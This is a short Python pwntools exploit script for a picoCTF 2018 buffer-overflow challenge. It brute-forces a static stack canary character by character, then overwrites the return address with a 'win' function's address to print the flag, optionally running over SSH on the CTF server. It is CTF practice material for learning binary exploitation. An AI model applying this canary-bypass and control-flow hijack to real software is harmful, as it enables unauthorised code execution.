#!/usr/bin/env python

from pwn import *
import sys
import string

#get arg # and determine if local or remote
argc = len(sys.argv)

#get ELF addresses
e = ELF('./vuln')
win = e.symbols['win']

#buf amount
buf = 32

context.log_level = 'critical'

canary = 'IHwj'

while len(canary) < 4:
	for char in string.printable:
		test = canary+char
		payload = ''
		payload+= 'A'*buf
		payload+= test
		p = process('./vuln')
		p.sendlineafter('> ', str(len(payload)))
		p.sendlineafter('Input> ', payload)
		if "Ok... Now Where's the Flag?" in p.recvall():
			canary+= char
			break
		else:
			p.close()
print "Canary: " + canary

if argc > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf')
else:
	p = process('./vuln')

#build payload and send it
payload = ''
payload+= 'A'*buf
payload+= canary
payload+= 'A'*16
payload+= p32(win)
p.sendlineafter('> ', str(len(payload)))
p.sendlineafter('Input> ', payload)
print p.recvuntil('}')